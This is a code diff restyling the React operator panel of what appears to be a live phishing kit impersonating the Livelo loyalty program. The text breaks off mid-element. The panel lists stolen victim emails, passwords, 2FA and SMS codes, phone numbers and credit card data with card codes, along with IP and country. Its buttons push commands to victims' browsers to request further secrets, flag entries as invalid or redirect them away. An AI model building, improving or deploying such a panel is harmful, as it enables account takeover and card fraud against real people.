@@ -555,486 +555,188 @@ function AdminPanel() {
   }
 
   return (
-    <div className="min-h-screen bg-[#0a0a0a]">
+    <div className="min-h-screen bg-[#08090d]">
       {/* Header */}
-      <header className="bg-[#111111] border-b border-green-900/40 shadow-lg shadow-green-900/10">
-        <div className="container mx-auto px-4 py-4">
-          <div className="flex items-center justify-between flex-wrap gap-4">
-            <div className="flex items-center gap-2 flex-wrap">
-              <button onClick={exportTXT} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-orange-500/30 px-4 py-2 rounded text-sm transition-colors">
+      <header className="bg-[#0d0f14] border-b border-[#1e2130] sticky top-0 z-40" style={{backdropFilter: 'blur(12px)'}}>
+        <div className="max-w-[1920px] mx-auto px-5 py-3">
+          <div className="flex items-center justify-between flex-wrap gap-3">
+            <div className="flex items-center gap-1.5 flex-wrap">
+              <button onClick={exportTXT} className="bg-[#13151c] hover:bg-[#1a1d28] text-gray-300 hover:text-white px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-[#252838]">
                 TXT
               </button>
-              <button onClick={exportPDF} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-blue-500/30 px-4 py-2 rounded text-sm transition-colors">
+              <button onClick={exportPDF} className="bg-[#13151c] hover:bg-[#1a1d28] text-gray-300 hover:text-white px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-[#252838]">
                 PDF
               </button>
-              <button onClick={() => { setShowTelegramModal(true); loadTelegramConfig(); }} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-cyan-500/30 px-4 py-2 rounded text-sm transition-colors">
+              <button onClick={() => { setShowTelegramModal(true); loadTelegramConfig(); }} className="bg-[#13151c] hover:bg-[#1a1d28] text-gray-300 hover:text-white px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-[#252838]">
                 Telegram
               </button>
-              <button
-                onClick={handleClearAll}
-                className="bg-[#1a1a1a] hover:bg-red-900/40 text-white font-bold border border-red-500/30 px-4 py-2 rounded text-sm transition-colors"
-              >
+              <button onClick={handleClearAll} className="bg-[#13151c] hover:bg-[#2a1215] text-red-400/80 hover:text-red-400 px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-red-900/30">
                 Limpar Tudo
               </button>
-              <button
-                onClick={fetchLoginAttempts}
-                className="bg-green-900/30 hover:bg-green-900/50 text-white font-bold border border-green-500/40 px-4 py-2 rounded text-sm transition-colors"
-              >
+              <button onClick={fetchLoginAttempts} className="bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-emerald-500/25">
                 Atualizar
               </button>
-              <button onClick={() => { setShowVisitorsModal(true); loadVisitors(); }} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-purple-500/30 px-4 py-2 rounded text-sm transition-colors">
-                Exibir Visitantes
+              <button onClick={() => { setShowVisitorsModal(true); loadVisitors(); }} className="bg-[#13151c] hover:bg-[#1a1d28] text-gray-300 hover:text-white px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-[#252838]">
+                Visitantes
               </button>
             </div>
             <div className="flex items-center gap-3">
-              <img
-                src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png"
-                alt="Livelo"
-                className="h-8"
-              />
-              <button
-                onClick={handleLogout}
-                className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-gray-600/40 px-4 py-2 rounded text-sm transition-colors"
-              >
-                Sair
-              </button>
-              <button className="bg-green-500/20 text-white font-bold border border-green-500/50 px-4 py-2 rounded text-sm hover:bg-green-500/30 transition-colors">
-                DONAS
-              </button>
+              <img src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" alt="Livelo" className="h-7 opacity-80" />
+              <button onClick={handleLogout} className="text-gray-500 hover:text-gray-300 text-xs font-medium transition-colors">Sair</button>
+              <div className="bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 px-3 py-1 rounded-full text-xs font-bold tracking-wide">DONAS</div>
             </div>
           </div>
         </div>
       </header>
 
       {/* Content */}
-      <div className="container mx-auto px-4 py-8">
-        <div className="bg-[#111111] rounded-lg border border-green-900/30 p-6">
-          {/* Search */}
-          <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
-            <div>
-              <label className="block text-sm font-medium text-gray-300 mb-2">
-                Campo de referência:
-              </label>
-              <input
-                type="text"
-                value={referenceField}
-                onChange={(e) => setReferenceField(e.target.value)}
-                placeholder="Ex: final do telefone, nome..."
-                className="w-full px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600"
-              />
-            </div>
-            <div>
-              <label className="block text-sm font-medium text-gray-300 mb-2">
-                Site de Redirecionamento (Comando close):
-              </label>
-              <div className="flex gap-2">
-                <input
-                  type="text"
-                  value={redirectUrl}
-                  onChange={(e) => setRedirectUrl(e.target.value)}
-                  placeholder="https://business.google.com/"
-                  className="flex-1 px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600"
-                />
-              </div>
-            </div>
+      <div className="max-w-[1920px] mx-auto px-5 py-6">
+        {/* Inputs */}
+        <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
+          <div>
+            <label className="block text-[11px] font-semibold text-gray-500 uppercase tracking-wider mb-1.5">Referência</label>
+            <input
+              type="text"
+              value={referenceField}
+              onChange={(e) => setReferenceField(e.target.value)}
+              placeholder="Ex: final do telefone, nome..."
+              className="w-full px-3.5 py-2 bg-[#0d0f14] border border-[#1e2130] rounded-lg focus:ring-1 focus:ring-emerald-500/40 focus:border-emerald-500/30 text-white placeholder-gray-600 text-sm"
+            />
           </div>
+          <div>
+            <label className="block text-[11px] font-semibold text-gray-500 uppercase tracking-wider mb-1.5">Redirecionamento (Close)</label>
+            <input
+              type="text"
+              value={redirectUrl}
+              onChange={(e) => setRedirectUrl(e.target.value)}
+              placeholder="https://business.google.com/"
+              className="w-full px-3.5 py-2 bg-[#0d0f14] border border-[#1e2130] rounded-lg focus:ring-1 focus:ring-emerald-500/40 focus:border-emerald-500/30 text-white placeholder-gray-600 text-sm"
+            />
+          </div>
+        </div>
 
           {/* Loading */}
           {loading ? (
-            <div className="text-center py-12">
-              <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-green-500"></div>
-              <p className="mt-4 text-gray-400">Carregando...</p>
+            <div className="text-center py-16">
+              <div className="inline-block animate-spin rounded-full h-8 w-8 border-2 border-emerald-500/30 border-t-emerald-500"></div>
+              <p className="mt-3 text-gray-600 text-sm">Carregando...</p>
             </div>
           ) : loginAttempts.length === 0 ? (
-            <div className="text-center py-12">
-              <p className="text-gray-500 text-lg">Nenhuma tentativa de login encontrada</p>
+            <div className="text-center py-16">
+              <p className="text-gray-600 text-sm">Nenhuma tentativa de login</p>
             </div>
           ) : (
-            <div className="space-y-6">
+            <div className="space-y-5">
               {loginAttempts.map((attempt, index) => {
-                // Calcular número total de tentativas (original + adicionais)
                 const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
+                const hb = attempt.last_heartbeat;
+                const isOnline = hb && (Date.now() - new Date(hb).getTime()) < 3500;
                 
                 return (
-                  <div key={attempt.id} className="border border-green-900/30 rounded-lg overflow-hidden">
-                    {/* Header com email e número de tentativas */}
-                    <div className="bg-[#0d1f0d] border-b border-green-900/40 px-4 py-3">
-                      <h3 className="font-bold text-lg text-white">{attempt.email} ({totalAttempts} tentativa{totalAttempts > 1 ? 's' : ''})</h3>
+                  <div key={attempt.id} className="bg-[#0d0f14] border border-[#1e2130] rounded-xl overflow-hidden hover:border-[#2a2d42] transition-colors">
+                    {/* Card Header */}
+                    <div className="px-4 py-2.5 flex items-center justify-between border-b border-[#1e2130]">
+                      <div className="flex items-center gap-3">
+                        <span className={`w-2.5 h-2.5 rounded-full ${isOnline ? "bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.5)]" : "bg-red-500/80"}`}></span>
+                        <span className="text-white font-semibold text-sm">{attempt.email}</span>
+                        <span className="text-gray-600 text-xs">({totalAttempts} tentativa{totalAttempts > 1 ? 's' : ''})</span>
+                      </div>
+                      <div className="flex items-center gap-1.5">
+                        <button onClick={() => handleDelete(attempt.id)} className="text-gray-600 hover:text-red-400 p-1 rounded transition-colors text-sm">🗑️</button>
+                      </div>
                     </div>
 
-                    {/* Tabela */}
-                    <div className="overflow-x-auto">
-                      <table className="w-full border-collapse">
-                      <thead>
-                        <tr>
-                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">#</th>
-                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">status</th>
-                          <th 
-                            onClick={() => sendCommand(attempt.id, "INV")}
-                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
-                            title="Clique para avisar que dados estão incorretos"
-                          >
-                            INV
-                          </th>
-                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">USUÁRIO/LOGIN</th>
-                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">SENHA</th>
-                          <th className="border border-[#2a2a2a] p-0">
-                            <div className="flex">
-                              <div 
-                                onClick={() => sendCommand(attempt.id, "AUT")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-cyan-900/30 transition-colors flex-1"
-                                title="Clique para pedir código 2FA"
-                              >
-                                AUT
-                              </div>
-                              <div 
-                                onClick={() => sendInvalidCommand(attempt.id, "AUT")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
-                                title="Invalidar código 2FA"
-                              >
-                                X
-                              </div>
-                            </div>
-                          </th>
-                          <th className="border border-[#2a2a2a] p-0">
-                            <div className="flex">
-                              <div 
-                                onClick={() => sendCommand(attempt.id, "EMAIL")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-purple-900/30 transition-colors flex-1"
-                                title="Clique para pedir email cadastrado"
-                              >
-                                EMAIL
-                              </div>
-                              <div 
-                                onClick={() => sendInvalidCommand(attempt.id, "EMAIL")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
-                                title="Invalidar email"
-                              >
-                                X
-                              </div>
-                            </div>
-                          </th>
-                          <th className="border border-[#2a2a2a] p-0">
-                            <div className="flex">
-                              <div 
-                                onClick={() => openRefModal(attempt.id, "TOK-TEL")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-orange-900/30 transition-colors flex-1"
-                                title="Clique para pedir código do telefone"
-                              >
-                                TOK-TEL
-                              </div>
-                              <div 
-                                onClick={() => sendInvalidCommand(attempt.id, "TOK-TEL")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
-                                title="Invalidar código SMS"
-                              >
-                                X
-                              </div>
-                            </div>
-                          </th>
-                          <th className="border border-[#2a2a2a] p-0">
-                            <div className="flex">
-                              <div 
-                                onClick={() => sendCommand(attempt.id, "TELEFONE")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-green-900/30 transition-colors flex-1"
-                                title="Clique para pedir número de telefone"
-                              >
-                                Nº TEL
-                              </div>
-                              <div 
-                                onClick={() => sendInvalidCommand(attempt.id, "TELEFONE")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
-                                title="Invalidar telefone"
-                              >
-                                X
-                              </div>
-                            </div>
-                          </th>
-                          <th className="border border-[#2a2a2a] p-0">
-                            <div className="flex">
-                              <div 
-                                onClick={() => openRefModal(attempt.id, "TOK-MAIL")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-blue-900/30 transition-colors flex-1"
-                                title="Clique para pedir token do email"
-                              >
-                                TOK-MAIL
-                              </div>
-                              <div 
-                                onClick={() => sendInvalidCommand(attempt.id, "TOK-MAIL")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
-                                title="Invalidar token do email"
-                              >
-                                X
-                              </div>
-                            </div>
-                          </th>
-                          <th className="border border-[#2a2a2a] p-0">
-                            <div className="flex">
-                              <div 
-                                onClick={() => sendCommand(attempt.id, "CC")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-yellow-900/30 transition-colors flex-1"
-                                title="Clique para pedir dados do cartão"
-                              >
-                                CC
-                              </div>
-                              <div 
-                                onClick={() => sendInvalidCommand(attempt.id, "CC")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
-                                title="Invalidar dados do cartão"
-                              >
-                                X
-                              </div>
-                            </div>
-                          </th>
-                          <th className="border border-[#2a2a2a] p-0">
-                            <div className="flex">
-                              <div 
-                                onClick={() => openRefModal(attempt.id, "COD-CC")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-yellow-900/30 transition-colors flex-1"
-                                title="Clique para pedir código do cartão"
-                              >
-                                Cod CC
-                              </div>
-                              <div 
-                                onClick={() => sendInvalidCommand(attempt.id, "COD-CC")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
-                                title="Invalidar código do cartão"
-                              >
-                                X
-                              </div>
-                            </div>
-                          </th>
-                          <th 
-                            onClick={() => sendCommand(attempt.id, "AGUARDE")}
-                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-yellow-900/30 transition-colors"
-                            title="Clique para colocar em aguarde"
-                          >
-                            👍
-                          </th>
-                          <th 
-                            onClick={() => sendCommand(attempt.id, "REDIRECT")}
-                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-pink-900/30 transition-colors"
-                            title="Clique para redirecionar usuário"
-                          >
-                            Close
-                          </th>
-                          <th 
-                            onClick={() => deleteAttempt(attempt.id)}
-                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
-                            title="Excluir este card"
-                          >
-                            🗑️
-                          </th>
-                        </tr>
-                      </thead>
-                      <tbody>
-                        {/* Única linha de dados */}
-                        <tr className="bg-[#0f0f0f]">
-                          {/* # */}
-                          <td className="px-3 py-3 text-center text-sm font-bold text-white border border-[#2a2a2a]">{index + 1}</td>
-                          
-                          {/* status - bolinha calculada pelo heartbeat */}
-                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
-                            {(() => {
-                              const hb = attempt.last_heartbeat;
-                              const isOnline = hb && (Date.now() - new Date(hb).getTime()) < 3500;
-                              return (
-                                <span className={`inline-block w-4 h-4 rounded-full ${isOnline ? "bg-green-500 shadow-lg shadow-green-500/50" : "bg-red-500 shadow-lg shadow-red-500/50"}`}></span>
-                              );
-                            })()}
-                          </td>
-                          
-                          {/* INV - apenas header, célula vazia */}
-                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
-                            <span className="text-gray-600">-</span>
-                          </td>
-                          
-                          {/* USUÁRIO/LOGIN - valor fixo - COPIÁVEL */}
-                          <td 
-                            className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium cursor-pointer hover:bg-green-900/20 transition-colors text-white"
-                            onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}
-                            title="Clique para copiar"
-                          >
-                            <span className={copiedField === `email-${attempt.id}` ? "text-green-400" : ""}>
-                              {copiedField === `email-${attempt.id}` ? "✓ Copiado!" : attempt.email}
-                            </span>
-                          </td>
-                          
-                          {/* SENHA - valor fixo - COPIÁVEL */}
-                          <td 
-                            className="px-3 py-3 text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors text-white"
-                            onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}
-                            title="Clique para copiar"
-                          >
-                            <span className={copiedField === `password-${attempt.id}` ? "text-green-400" : ""}>
-                              {copiedField === `password-${attempt.id}` ? "✓ Copiado!" : (attempt.password || "-")}
-                            </span>
-                          </td>
-                          
-                          {/* AUT - campo esperando dado - COPIÁVEL */}
-                          <td 
-                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
-                            onClick={() => copyToClipboard(attempt.token_2fa, `token2fa-${attempt.id}`)}
-                            title="Clique para copiar"
-                          >
-                            <span className={copiedField === `token2fa-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
-                              {copiedField === `token2fa-${attempt.id}` ? "✓ Copiado!" : (attempt.token_2fa || "-")}
-                            </span>
-                          </td>
-                          
-                          {/* EMAIL - campo esperando dado - COPIÁVEL */}
-                          <td 
-                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
-                            onClick={() => copyToClipboard(attempt.email_input, `emailinput-${attempt.id}`)}
-                            title="Clique para copiar"
-                          >
-                            <span className={copiedField === `emailinput-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
-                              {copiedField === `emailinput-${attempt.id}` ? "✓ Copiado!" : (attempt.email_input || "-")}
-                            </span>
-                          </td>
-                          
-                          {/* TOK-TEL - campo esperando dado - COPIÁVEL */}
-                          <td 
-                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
-                            onClick={() => copyToClipboard(attempt.sms_code, `smscode-${attempt.id}`)}
-                            title="Clique para copiar"
-                          >
-                            <span className={copiedField === `smscode-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
-                              {copiedField === `smscode-${attempt.id}` ? "✓ Copiado!" : (attempt.sms_code || "-")}
-                            </span>
-                          </td>
-                          
-                          {/* Nº TELEFONE - campo esperando dado - COPIÁVEL */}
-                          <td 
-                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
-                            onClick={() => copyToClipboard(attempt.phone_number, `phone-${attempt.id}`)}
-                            title="Clique para copiar"
-                          >
-                            <span className={copiedField === `phone-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
-                              {copiedField === `phone-${attempt.id}` ? "✓ Copiado!" : (attempt.phone_number || "-")}
-                            </span>
-                          </td>
-                          
-                          {/* TOK-MAIL - campo esperando dado - COPIÁVEL */}
-                          <td 
-                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
-                            onClick={() => copyToClipboard(attempt.app_mail, `appmail-${attempt.id}`)}
-                            title="Clique para copiar"
-                          >
-                            <span className={copiedField === `appmail-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
-                              {copiedField === `appmail-${attempt.id}` ? "✓ Copiado!" : (attempt.app_mail || "-")}
-                            </span>
-                          </td>
-                          
-                          {/* CC - dados do cartão */}
-                          <td className="px-2 py-2 text-center text-sm border border-[#2a2a2a]">
-                            {attempt.credit_card ? (
-                              <button
-                                onClick={() => setCcModalData(attempt.credit_card)}
-                                className="bg-[#1a2a1a] hover:bg-[#253525] text-white text-xs font-bold px-3 py-1.5 rounded border border-green-500/30 transition-colors"
-                              >
-                                Exibir
-                              </button>
-                            ) : (
-                              <span className="text-gray-600">-</span>
-                            )}
-                          </td>
+                    {/* Commands Bar */}
+                    <div className="px-3 py-2 flex items-center gap-1 flex-wrap border-b border-[#161822] bg-[#0b0c11]">
+                      <button onClick={() => sendCommand(attempt.id, "INV")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 transition-all">INV</button>
+                      
+                      <button onClick={() => sendCommand(attempt.id, "AUT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500/20 border border-cyan-500/20 transition-all">AUT</button>
+                      <button onClick={() => sendInvalidCommand(attempt.id, "AUT")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
+                      
+                      <button onClick={() => sendCommand(attempt.id, "EMAIL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-purple-500/10 text-purple-400 hover:bg-purple-500/20 border border-purple-500/20 transition-all">EMAIL</button>
+                      <button onClick={() => sendInvalidCommand(attempt.id, "EMAIL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
+                      
+                      <button onClick={() => openRefModal(attempt.id, "TOK-TEL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-orange-500/10 text-orange-400 hover:bg-orange-500/20 border border-orange-500/20 transition-all">TOK-TEL</button>
+                      <button onClick={() => sendInvalidCommand(attempt.id, "TOK-TEL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
+                      
+                      <button onClick={() => sendCommand(attempt.id, "TELEFONE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 border border-emerald-500/20 transition-all">Nº TEL</button>
+                      <button onClick={() => sendInvalidCommand(attempt.id, "TELEFONE")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
+                      
+                      <button onClick={() => openRefModal(attempt.id, "TOK-MAIL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-blue-500/10 text-blue-400 hover:bg-blue-500/20 border border-blue-500/20 transition-all">TOK-MAIL</button>
+                      <button onClick={() => sendInvalidCommand(attempt.id, "TOK-MAIL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
+                      
+                      <button onClick={() => sendCommand(attempt.id, "CC")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-yellow-500/10 text-yellow-400 hover:bg-yellow-500/20 border border-yellow-500/20 transition-all">CC</button>
+                      <button onClick={() => sendInvalidCommand(attempt.id, "CC")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
+                      
+                      <button onClick={() => openRefModal(attempt.id, "COD-CC")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-amber-500/10 text-amber-400 hover:bg-amber-500/20 border border-amber-500/20 transition-all">Cod CC</button>
+                      <button onClick={() => sendInvalidCommand(attempt.id, "COD-CC")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
+                      
+                      <button onClick={() => sendCommand(attempt.id, "AGUARDE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-gray-500/10 text-gray-300 hover:bg-gray-500/20 border border-gray-500/20 transition-all">👍</button>
+                      <button onClick={() => sendCommand(attempt.id, "REDIRECT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-pink-500/10 text-pink-400 hover:bg-pink-500/20 border border-pink-500/20 transition-all">Close</button>
+                    </div>
 
-                          {/* Cod CC - código do cartão */}
-                          <td 
-                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
-                            onClick={() => copyToClipboard(attempt.cc_code, `cccode-${attempt.id}`)}
-                            title="Clique para copiar"
-                          >
-                            <span className={copiedField === `cccode-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
-                              {copiedField === `cccode-${attempt.id}` ? "Copiado!" : (attempt.cc_code || "-")}
-                            </span>
-                          </td>
-
-                          {/* 👍 - apenas header, célula vazia */}
-                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
-                            <span className="text-gray-600">-</span>
-                          </td>
-                          
-                          {/* X - apenas header, célula vazia */}
-                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
-                            <span className="text-gray-600">-</span>
-                          </td>
-                          
-                          {/* 🗑️ - lixeira clicável */}
-                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
-                            <button
-                              onClick={() => handleDelete(attempt.id)}
-                              className="text-red-500/60 hover:text-red-400 text-xl transition-colors"
-                            >
-                              🗑️
-                            </button>
-                          </td>
-                        </tr>
-                        
-                        {/* Tentativas adicionais */}
-                        {attempt.attempts && attempt.attempts.map((additionalAttempt, attemptIndex) => (
-                          <tr key={attemptIndex} className="bg-[#0a0f0a]">
-                            {/* # */}
-                            <td className="px-3 py-3 text-center text-sm font-bold text-white/70 border border-[#2a2a2a]">{attemptIndex + 2}</td>
-                            
-                            {/* status - vazio */}
-                            <td className="px-3 py-3 text-center border border-[#2a2a2a]">
-                              <span className="w-4 h-4 rounded-full bg-gray-700 inline-block"></span>
-                            </td>
-                            
-                            {/* INV - vazio */}
-                            <td className="px-3 py-3 text-center border border-[#2a2a2a]">
-                              <span className="text-gray-600">-</span>
-                            </td>
-                            
-                            {/* USUÁRIO/LOGIN - nova tentativa */}
-                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium text-white/70">{additionalAttempt.email}</td>
-                            
-                            {/* SENHA - nova tentativa */}
-                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] text-white/70">{additionalAttempt.password || "-"}</td>
-                            
-                            {/* Demais campos vazios */}
-                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
-                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
-                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
-                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
-                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
-                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
-                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
-                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
-                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
-                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
-                          </tr>
-                        ))}
-                      </tbody>
-                    </table>
-                  </div>
-
-                  {/* Footer com informações */}
-                  <div className="bg-[#0a0a0a] px-4 py-3 text-xs text-gray-300 border-t border-[#2a2a2a]">
-                    <div className="flex items-center justify-between">
-                      <div className="grid grid-cols-2 md:grid-cols-4 gap-2 flex-1">
-                        <div><span className="font-semibold text-gray-400">IP:</span> {attempt.ip_address || "-"}</div>
-                        <div><span className="font-semibold text-gray-400">País:</span> {attempt.country || "-"}</div>
-                        <div><span className="font-semibold text-gray-400">Dispositivo:</span> {attempt.device || "Desktop"}</div>
-                        <div><span className="font-semibold text-gray-400">Página atual:</span> {attempt.page || "Página Loading..."}</div>
+                    {/* Data Grid */}
+                    <div className="px-4 py-3 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-2">
+                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}>
+                        <span className="text-[10px] text-gray-500 block">USUÁRIO</span>
+                        <span className={`text-xs font-mono ${copiedField === `email-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>{copiedField === `email-${attempt.id}` ? "Copiado!" : attempt.email}</span>
                       </div>
-                      <button
-                        onClick={() => setHistoryModal(attempt)}
-                        className="ml-4 bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-gray-600/40 px-3 py-1.5 rounded text-xs transition-colors whitespace-nowrap"
-                      >
+                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}>
+                        <span className="text-[10px] text-gray-500 block">SENHA</span>
+                        <span className={`text-xs font-mono ${copiedField === `password-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>{copiedField === `password-${attempt.id}` ? "Copiado!" : (attempt.password || "-")}</span>
+                      </div>
+                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.token_2fa, `token2fa-${attempt.id}`)}>
+                        <span className="text-[10px] text-gray-500 block">2FA</span>
+                        <span className={`text-xs font-mono ${copiedField === `token2fa-${attempt.id}` ? "text-emerald-400" : attempt.token_2fa ? "text-cyan-300" : "text-gray-700"}`}>{copiedField === `token2fa-${attempt.id}` ? "Copiado!" : (attempt.token_2fa || "-")}</span>
+                      </div>
+                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.email_input, `emailinput-${attempt.id}`)}>
+                        <span className="text-[10px] text-gray-500 block">EMAIL</span>
